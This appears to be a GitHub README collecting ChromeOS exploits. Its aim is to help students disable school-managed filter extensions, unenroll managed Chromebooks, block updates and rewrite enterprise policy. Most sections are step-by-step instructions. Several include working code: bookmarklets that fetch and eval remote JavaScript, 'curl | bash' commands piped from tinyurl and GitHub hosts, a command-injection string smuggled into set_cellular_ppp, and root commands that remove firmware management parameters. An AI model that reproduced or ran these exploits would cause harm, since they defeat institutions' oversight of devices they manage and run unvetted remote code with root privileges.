# Exploits And Hacks
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more!
Many of these exploits can destory your computer if used inproperly. So PLEASE PLEASE make sure you follow these instructions very carefully!
If you need help ask it <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/discussions">here</a>

Note: Students to see the list of more exploits click on JPCMG [LTBEEF with Service workers and scroll down.
  
**ATTENTION ALL SYS ADMINS!!!**

Hello, I am Brandon and I forked this repo from <a href="https://github.com/3kh0/ext-remover">3kh0</a> in order to give updated and old exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of whack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
Image Credit: LittleMissNyan

<details>
<summary><b>LTMEAT</b> Freeze extensions</summary>

  **DO NOT UPDATE YOUR CHROMEBOOK TO CHROME VERSION 115 OR ABOVE**

**Patched** **On** **Chrome** **Versions** **115** **And** **above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

From [ltmeat.bypassi.com](https://ltmeat.bypassi.com), if you are intrested in how this exploit works, check out that website.

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also just do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhere/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. While on the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 

If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs and the extension will basically be dead. If nothing loads, then you probably reloaded too late or spammed too slow. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [further reading](https://ltmeat.bypassi.com)

### "Help me! I'm an idiot!"

Turns out that I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit an a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is extremely misleading. Nobody blocked it--you just need to find the right extension ID (see above).

If you got this because you tried to visit the `extension_id_here_please` example URL, you should be extremely ashamed of yourself. Please change and grow as a person. 

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon should show up to the right of your refresh icon in the top left. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension but now I can't load websites!**

If you actually just read the writeup, you'd know that this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners means you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you weren't spamming bookmark C fast enough. The most reliable fix for this is to just restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](https://ltmeat.bypassi.com/img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way, or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension, why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. And again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

*Need more help? [Ask in the discussions](https://github.com/3kh0/ext-remover/discussions)*

</details>

<details>
<summary><b>Baby LTMEAT</b> Freeze extensions</summary>

**Patched On Chrome Versions 115 And Above**
  
BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGES.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.

2. Visit that chrome-extension://blockeridhere page, then type chrome://hang in the URL bar of that tab. It should start loading infinitely.

3. Right-click the tab and duplicate it. Don't close anything.

4. Go to the chrome://extensions page for the blocker extension you want to Disable.

5. If that page has any sort of switch, such as "Allow access to file URLs", click that switch. If there are no clickable switches, cry in a corner or something.

The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

</details>

<details>
<summary><b>LTMEAT Flood</b> Freeze extensions</summary>

  **If your Chromebook has received the 115 And Above patch on the stable channel Then Here's A New Method For LTMEAT**
  
  
**Unpatched on 115 and above**

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Create a bookmark folder and paste the extension page lots of times. (About 800 minimum is recommended assuming your Chromebook is average school quality) It is recommended that you add the extension page at the beginning of the folder.

2. Right click and open all in a new window.

3. Close the window with all those tabs.

4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)

5. Flip the Allow access to file URLs switch in the extension settings and then you've bypassed the patch and the exploit is working.

6. Close everything and you're good to go. If it didn't work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!

**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this workaround

</details>

<details>
<summary><b>Baby LTMEAT Flood</b> Freeze extensions</summary>

**Unpatched on 115 and above**

1. First of all, get your folder with 800+ extension page tabs and open it in a new window, for my Chromebook i used 800 extension page tabs as i feel it's the right amount for me

2. Close the newly opened Window with 800+ extension page tabs

3. Click into your folder, and open one of the extension page tab in a new window, maybe waiting slightly longer this time, to confirm it worked. If it loads, you did it wrong. If you see a "page unresponsive screen, and a wait/exit page button" you did it right" But don't click either of the buttons. (if you want to do it fast you can just see that the page always has a spinning loading circle)

4. Now go to `chrome://extensions/?id=yourblockerID`  Then scroll down and flick the "allow access to file URLs" lever and close the window with the 1 extension page tab remaining.

</details>

<details>
<summary><b>Anesthesia</b> Freeze extensions with printing</summary>

1. Find your extension's largest file. This can usually be found by poking around in your extension's manifest.json or you can use <a href="https://robwu.nl/crxviewer/">Rob Wu's crxviewer</a> to find your extensions largest file.

2. Go to that page. and hit `Ctrl`+`P`. A print window shoudl show up, with a number of pages in the top right.

3. Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you can get that number, the longer the effect will last.

4 Hit reload. The page should start hanging.

5. Go to your extension's settings page. This is in `chrome://extensions`.

6. Duplicate your "printing" tab, and go back to your extension's settings page.

7. Flip any switch you can find there. Usually there'll be one titled "`Allow Access to File:// [URL]s`".

8. Presto! Go have fun on the (probably) unblocked web.

FAQ:
Where do I find my extension's manifest.json?
First find your extension's ID. This is a 32-character code that can be found in your extension's settings page, normally near or at the top. Then go to chrome-extension://your-32-char-id-goes-here/manifest.json

Credit to <a href="https://buymeacoffee.com/bypassi">Bypassi</a> for the original LTMEAT framework, and HUGE thanks to Swordmaster4321 for discovering that pages can be hanged with printing.

</details>

<details>
<summary><b>LoMoH</b> Disable extensions</summary>

  **This exploit has been patched in Chrome OS 111 after being found and reported. It should have gotten admin protection sooner.**

  **About: LoMoH is a Chromebook exploit that uses the Chrome OS locked mode feature to soft disable enforced extensions (excluding Hapara Highlights if installed).**
  
HTML VERSION: <a href="https://tiny.cc/LoMoH">LoMoH HTML</a>

BOOKMARKLET VERSION: `javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()`

Credit to <a href="https://github.com/AshtonDavies">Ashton Davies</a> for finding this exploit

</details>

<details>
<summary><b>Dextensify</b> Freeze extensions</summary>

**Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.**

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>, or download the file here <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/blob/main/Dextensify.html">Dextensify.html</a>

Credit to <a href="https://ading.dev/">ading2210</a> for finding/Making this exploit

</details>

<details>
<summary><b>JPCMG</b> LTBEEF with Service workers</summary>

**Requirements**
- Access to `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this wont work if theres not a plugin in there.
3. Hit the start button then the `inspect` button, run basic LTBEEF code
```js
chrome.management.setEnabled('<plugin id here>',false)
```
4. Profit

![image](https://user-images.githubusercontent.com/58097612/234904781-4d5ad77e-6045-435e-8aae-df12dec53013.png)

Thanks to Nyaann#3881 for this exploit

</details>

<details>
<summary><b>Corkey</b> Corrupt extensions</summary>

**Corkey does indeed include power washing the Chromebook, which wipes local data including everything under "My files," so I suggest you select everything you want to drag and back up to Google Drive if that's available for your account.**

**Chromebooks Only**

1. `Esc`+`Refresh`+`Power` and re-enroll (Enter recovery page) or you can just powerwash

2. log into your chromebook and immediately turn off wifi and do `refresh`+`power` to (instant restart)

3. Log back into your chromebook with the wifi off. There should be something on the side of the connect wifi page that says log in offline or sign in as a existing user.

4. Go to `chrome://extensions`, turn on wifi, and wait for your schools blocking extension to appear.

5. As soon as it appears turn off wifi and instant restart as fast as you can.

6. Log back in and go back to extensions and wait. If it says your blocking extension could be corrupted or doesnt appear at all then it worked (wait atleast a minute with a close watch incase it comes back)

7. If it didnt work repeat from step 1.

8. If it did work you could go onto anything

</details>

<details>
<summary><b>Extension Launcher</b> Install extensions w/o allowlist</summary>
A bookmarklet capable of installing extensions, for those without a allowlist. 

Steps: 

1. Go to <a href="https://extension-installer.glitch.me/code.js">here</a> bookmark the code there (Might make a dns)

2. go to <a href="https://chrome.google.com/webstorex">chrome.google.com/webstorex</a> and use the bookmarklet, then put the icon of the extension, the id, and name of it (Doesn't matter just put anything)

3. press download, and it will work.

**Extra Notes**
- Credit to "Aka, but nice" on discord.
- Dns will be up soon, if bookmarklets are blocked
- This will not work if you have a blocklist this is only for if when you go to the webstore it shows blocked
</details>

<details>
<summary><b>Point-Blank</b> Scripts on extension pages</summary>

This exploit allows you to run scripts, on extensions pages, this is a great example of how Chromebooks are a piece of garbage.

<i>Getting started</i>
(Note: if bookmarklets are blocked your screwed.)

1. Go to <a href="https://spot-maze-chinchilla.glitch.me/ingot.js">here</a> <a href="https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js">if blocked</a> on your school chromebook.

2. Make a bookmark with the code there.

3. Once that is done,

 If you have Securly go to <a href="https://tinyurl.com/bettergoofcurly">here</a> if it says blocked by chrome, reload (you have to actually have securly ofc)
 
 If you have iBoss go to <a href="https://tinyurl.com/goofboss">here</a>.
 
 If you have Cisco Umbrella go to <a href="https://tinyurl.com/goofumbrella">here</a>.
 
 If you have Blocksi go to <a href="https://tinyurl.com/goofsi">here</a>.
 
 And if you have GoGuardian(might not work) go to <a href="https://tinyurl.com/goofguardian">here</a>. 
 
 Now most of these links are a block page(this is intentional) on each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made and click either hard disable or soft disable, you can also run some of the scripts and run your own code, your extension may disable javascript being ran on it, so running your own code may not work.
 
**Extra notes**
- I recommend doing soft disable, which only disables it until restart. 
- The launcher was made by 3kh0, but the idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>
- If your school updated GoGuardian, this exploit may not work.

</details>

<details>
<summary><b>UBoss</b> Tamper with IBoss</summary>

By the BlueHatCrew
<a href="https://dsc.gg/blue-hat-crew">https://dsc.gg/blue-hat-crew</a>

This works only for iBoss, and Blocksi, If you don't have one of these, use Blank3r or Point Blank.

1. Go to https://tinyurl.com/byeswamp if you have iBoss or https://tinyurl.com/blockboss if you have Blocksi.
Then bookmark the code below
```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesnt work let us know by creating a discussion, this was made in partnership with Aka, but nice#5094 and Bypassi#7037.

</details>

<details>
<summary><b>A Bypass For IBoss</b> Unblock websites that are blocked by IBoss</summary>

1. Firstly go over to your unblocked website you want to access. 

2. After visiting the website it should be blocked.

3. You want to turn off your wifi, then spamclick the blocked link  (not the url)

4. Then after spamclicking, turn on your wifi.

5. It should redirect you to "your connections been dissrupted" press reload.

6. Then you should be at the blocked website completely unblocked!!

(NOTE: THIS ONLY WORKS ON SOME WEBSITES)

</details>

<details>
<summary><b>CAUB</b> Prevent Updates</summary>

This exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your chromebook that the wifi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

![image](https://user-images.githubusercontent.com/58097612/212685932-ef9c802e-6040-42a3-be6e-10997162b7cd.png)

<i>Getting started</i>

1. Go to `chrome://network#state` (on your school chromebook of course; if this is blocked then ur kinda screwed lol).
2. Scroll to the bottom of the page; you should see a list of "favorite" wifis that you've connected to in the past.
3. Click the `+` sign next to the wifi name of each network that you commonly connect your chromebook to.
4. The more wifis you expand, the better, but note that they have to come from the "favorites" section.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox bshelow.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import onc` button.
11. Import the newly downloaded file.

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you are on a wifi that you used caub on)
- Be careful not to stay on a wifi for too long without using caub on it, otherwise you might update.
- We cannot guarantee that this will work on every wifi

</details>

<details>
<summary><b>CAUB Via Flags</b> Prevent Updates</summary>

This alt exploit keeps your chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a chrome flag, you can convince your chromebook not to automatic update.

### Requirements
- Access to `chrome://flags`

<i>Getting started</i>

1. Go to `chrome://flags#show-metered-toggle` or search "metered" in `chrome://flags` instead.

2. Enable it and restart your device.

3. Open the Settings app.

4. Go to your Network >> Advanced >> Show metered toggle and turn it on

**Extra notes**
- Your chromebook will no longer automatically update. (as long as you have the flag enabled)
- And you must be able to enable flags if it ain't blocked otherwise this exploit won't work

</details>

<details>
<summary><b>LTBEEF</b> Disable extensions</summary>

LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore. The original site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
**Installation**  
There are several vesions of this exploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    1. To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```js
    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
    ```
    - Compact Cow's UI  
    ```js
    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
    ```  
    - Compact Cow's UI (Dark)
    ```js
    javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
    ```
    2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    3. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    1. First, go to Settings > Network > Wifi > Network.
    2. Click on `Custom Name Servers`
    
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
    
    3. Set every box there to the following ip:
    ```
    158.101.114.159
    ```
    (Hosted by The Greatest Giant#0110)  
    4. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
    5. Flip the switches on the extentions you want to disable.
    6. Profit
    
</details>  

<details>
<summary><b>LTBEEF inspect</b> Using inspect to disable extensions</summary>

![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)

The screenshot below was preformed on `108.0.5359.75` (Official Build) (64-bit) on the stable channel. This has been tested and does work but has varying levels of success, you will need access to inspect element, more specifically, console.

1. Open this on your chromebook: 
```
chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json
``` 
Shortened link: https://tinyurl.com/i-ltbeef
2. Open inspect and navigate to the console tab.
3. Run the basic LTBEEF code such as
```js
chrome.management.setEnabled('extensionid', false)
```
Replacing `extensionid` with the ID of the extension you want to disable, e.g. the stuff after the = in the URL bar when you click the extension's "details" button in chrome://extensions

Credit to SprinkzMC#8421 (aka Bypassi) for finding this!

![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)

To re-enable just go to the chrome web listing for the extension and click on the banner.

</details>

<details>
<summary><b>Blank3r</b> Reload extensions continuously</summary>

Point Blank is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

You can either use the prompt or the gui the prompt is below

1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```

And the gui is in launcher.js


2. Navigate to `chrome://extensions`.

3. Click on a extension that YOU installed from the Chrome Web Store > Details.

4. In the URL bar, copy the string of letters and numbers after the `/?id=`.

5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet.

5. Paste the id of the extension into the prompt or input box seperated by commas.

If you close the tab, the exploit will stop working.

</details>

<details>
<summary><b>SH1mmer</b> Unenrollment</summary>  
sh1mmer is an exploit developed by the crew at Mercury Workshop. Credits can be found within the menu and on their site.  

Further information is now located at these links:

<a href="https://github.com/CoolElectronics/sh1mmer">Official Repository</a>  

<a href="https://sh1mmer.me/">Official Website (INSTRUCTIONS)</a>

<a href="https://dl.osu.bio/">Raw Shims Download</a>

</details>

<details>
<summary><b>SH1mmer V111 → V113</b> Unenrollment</summary>
How to use SH1MMER on v111 → v113
(if you're willing to take the back cover off your Chromebook)

you'll only need to do this once, and it will let you use SH1MMER even after it's been completely patched



        1. Unplug everything, open the back panel, disconnect the battery to disable WP, plug in the charger
        2. boot into SH1MMER and use "Un-Enroll / Deprovision" (yes I know it will show an error, but that doesn't
        matter)
        (you will also need to run "Disable block_devmode" if you're using the old legacy version)
        3. go to the bash shell and run this command:
        /usr/share/vboot/bin/set_gbb_flags.sh 0x8090
        do not use "Reset GBB Flags" after this

        4. exit SH1MMER, unplug everything, reconnect the battery, reconnect the charger
        5. boot up, press CTRL + D to enter developer mode
        6. once it completes, use CTRL + ALT + SHIFT + R to powerwash
        7. after powerwash, immediately go into VT2 by pressing CTRL + ALT + F2 (→), login as "root" and run these commands:
        tpm_manager_client take_ownership
        cryptohome --action=remove_firmware_management_parameters
        if it fails, try downgrading to v110 if possible. if you can't, use E-Halycon instead.
        8. press CTRL + ALT + F1 (←), use CTRL + ALT + SHIFT + R to powerwash again
        9. profit

        NOTE: if you're on dedede, your WP method is probably different. look your model up online to find the WP
        method.

</details>

<details>
<summary><b>E-Halcyon</b> Unenrollment Or Downgrade</summary>

First of all, you'll need a linux PC or VM. WSL is not guaranteed to work

Now, you'll need to boot into SH1MMER, and press the Un-Enroll option. It won't truly unenroll you if you've received the 112 update patching unenrollment and downgrading, but it is still a necessary step for the rest of this. If you've never used SH1MMER before or don't have an image lying around, make sure to follow all the instructions on sh1mmer.me for unenrollment before proceeding with the rest of the tutorial here

Next, you need a version 107 recovery image corresponding to your board, which you can pick up from chrome100.dev. Once you've downloaded the right image for your board and have confirmed it's for version 107, unzip it and save it to a safe place. Now open up a terminal and type in the following commands (make sure to replace /path/to/recovery/image.bin with the actual path)

```
git clone https://github.com/MercuryWorkshop/RecoMod
cd RecoMod
chmod +x recomod.sh
sudo ./recomod.sh -i /path/to/recovery/image.bin --halcyon --rw_legacy
```

The script will modify the image in place, and it can now be flashed with a standard recovery tool onto a USB of your choice.

Enable developer mode and get to the dev mode block screen similarly to how you would with SH1MMER, then plug in the USB. The recovery screen will show up, and at this point you need to start spamming the E key on your keyboard. It will begin a 5 minute wait sequence, and near the end of the 5 minutes start spamming E again. You will only have to wait 5 minutes once, subsequent boots will have the 5 minute wait omitted

The boot splash will show, and you will enter a special menu. Use arrow keys to navigate the cursor down to "activate halcyon environment" and press enter. Then navigate down to "Install halcyon semi-tethered" and wait for it to finish. Once it's finished, go back to "activate halcyon environment" and press "Boot halcyon semi-tethered". and you will be booted into a downgraded and unenrolled ChromeOS environment.

FAQ:
How does this work?
See the writeup for more information

Can the admins see that I'm doing this?
No.

Why don't my history/cookies/etc save after a reboot?
Unfixable restriction of cryptohome. See the writeup for more information

Why is my Chromebook "Missing or damaged?"
After installing E-Halcyon, you won't be able to boot Chrome OS normally. You'll have to keep the usb around to jumpstart the booting process

Where do I report bugs?
The RecoMod GitHub

Why does it say "E mode not activated" when I try to boot halcyon?
You spammed the E key when starting at the wrong time, or not at all

Credits:
CoolElectronics - RecoMod, working switch_root, and everything else
OlyB - Insight and contributions to the RecoMod script
vk6 - Created this website

</details>

<details>
<summary><b>Old Weird Unenrollment</b> Unenrollment</summary>

if you have a chromebook that's on a version below 101  
(check `chrome://version` to see)
press ctrl+alt+t and type this in            


`set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`

                                                         
           then powerwash and it will unenroll           
                       cool right                        

    to re-enroll, open a bash shell and type these in one by one
```
sudo -i
```

```
vpd -i RW_VPD -s check_enrollment=1
```

```
echo "fast safe" > /mnt/stateful_partition/factory_install_reset
reboot
```

</details>

<details>
<summary><b>Shimboot</b> Linux from RMA shim</summary>

Shimboot is a collection of scripts for patching a Chrome OS RMA shim to serve as a bootloader for a standard Linux distribution. It allows you to boot a full desktop Debian install on a Chromebook, without needing to unenroll it or modify the firmware.
  
**For more detailed information, please see the project's <a href="https://github.com/ading2210/shimboot">README</a>**

Further reading:
- <a href="https://shimboot.ading.dev/">https://shimboot.ading.dev/</a>
- <a href="https://github.com/ading2210/shimboot">https://github.com/ading2210/shimboot</a>

Credit to <a href="https://ading.dev/">vk6</a> for this exploit

</details>

<details>
<summary><b>Skiovox</b> Unrestricted browsing</summary>

### What is it?

An exploit that allows for browsing within a completely unblocked Chrome
browser. It works on ChromeOS 118 and a wide range of previous versions.
- Skiovox utilizes a bug in kiosk apps
- Very similar to a bug from 3 years ago
Within the unblocked browser, you can
- Install extensions
- Bypass pretty much all blocks
- Do whatever the honk you want

### How to use it

Bypassi made a wonderful slideshow for you goof balls to follow, view using any of the links below!

- <a href="https://www.skiovox.com/">https://www.skiovox.com/</a>
- <a href="https://skiovox.netlify.app">https://skiovox.netlify.app</a>
- <a href="https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview">https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview</a>
- <a href="https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx">https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx</a>

</details>

<details>
<summary><b>Fakemurk</b> Trick your Chromebook into being in developer mode while being enrolled in your school's profile</summary>

**Fakemurk is a script that is able to run in developer mode to trick your Chromebook into being in developer mode while being enrolled in your school's profile. You can use this to disable any extension, as well as have full access to the chrome web store and google play store. This basically provides a personal Chromebook-like experience, while still being enrolled.**

Go here and follow instructions: <a href="https://docs.google.com/document/d/1Pku_CbEG9SwQtnm0I188RtpdpW8nXQhiNdMp8PN7Mik/edit?pli=1">Fakemurk Doc</a>

</details>

<details>
<summary><b>Pollen</b> Chrome OS User Policy Editor</summary>

**DEV MODE ONLY**

Normal Use
open crosh

```
run shell
run sudo su
run
curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash
```

then press alt+vol_up+x

to make your own modifactions refer to the Pollen Wiki

<a href="https://github.com/MercuryWorkshop/Pollen/wiki#getting-your-policies">Pollen Modifaction Wiki</a>

</details>

<details>
<summary><b>Customized Pollen</b> Chrome OS Policy Editor Customized</summary>

**Customized Pollen for SH1mmered chrombook users.** 

The original pollen by Mercury Workshop: <a href="https://github.com/MercuryWorkshop/Pollen">Pollen GitHub</a> 

It removes all admin installed extensions and thats kinda a problem for everyone so fruvs (op) edited it to make it fit more for SH1mmer users because fruvs (op) already got caught once cause he got snitched on.

So fruvs (op) customized this one to edit lots of features. But to keep all admin installed extensions so no one get's caught. So fruvs (op) edited some

incognito mode: on (everything unblocked, idk if extensions like GoGauridan can see)

ExtensionSettings: all settings removed

HomepageLocation: chrome://newtab

NewTabPageLocation: (left empty)

ManagedBookmarks: removed all school added bookmarks

PinnedLauncherApps: removed all force pinned apps to home bar

RestoreOnStartupURLs: (set it so when you open a new window some schools forces it to also open the schools homepage so                                                          its set back to new tab and no extra tabs)

WebAppInstallForceList: removed all force installed apps


How to run

Note: Devmode NEEDS to be enabled.
Open Crosh

Run
```
shell
```
Run
```
sudo su
```

Run 
```
curl -Ls https://tinyurl.com/repollen | bash
```

Done! It may take a few seconds for the new policy to apply. If it does not apply, press 
```
alt+vol_up+x
```

Errors

If you have Linux enabled you will have to turn it off and turn it back on for it to work

THIS WILL RESET EVERY TIME YOU RESTART THE CHROMEBOOK SO YOU WILL NEED TO RE DO THE PROCESS

</details>

<details>
<summary><b>Fusion 360 exploit</b> Unblocked browser</summary>

**Some schools have Fusion360 already downloaded and if it isn’t, then download it through the play store. This exploit opens an unblocked browser inside of Fusion.** 

What you do is on the sign-up page, click terms of service. Then there is a YT logo at the bottom. Click it to go to the social media page. Next, click Autodesk under the YouTube text. Using this method, you get unblocked YT! For unblocked google, just look up “google.com link is description”. Go to the description and click google.com. Done! 

The admin can remove apps, so it can still be blocked.

</details>

<details>
<summary><b>Downgrading</b> Change versions</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4gb of storage, some board have small or bigger images, I recommend 16gb
2. A personal computer with access to downloading extentions
3. A brain
If you do not have these, you **CAN NOT** perform the exploit!

<i>Setup</i>
1. Navigate to `chrome://version` on the chromebook you with to downgrade and check for your board under `Platform` (ex I have a c3100 and it's board is stable-channel octopus).

<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">

2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board.
3. Find and download the chrome version you want to your personal computer.

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
2. Open the extention, and click on the settings button in to top right hand corner, and click "use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.
7. Profit.

</details>

<details>
<summary><b>Killcurly</b> Break extensions</summary>
Kill extension, by signing out.

1. Visit `chrome://settings/signOut`, the O in Out must be capital.
2. Press the big blue button
3. Go to `chrome://restart`
4. Now visit <a href="https://tinyurl.com/AddSession">tinyurl.com/AddSession</a> or <a href="https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession">this link</a>
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, Youtube, and any Google service.
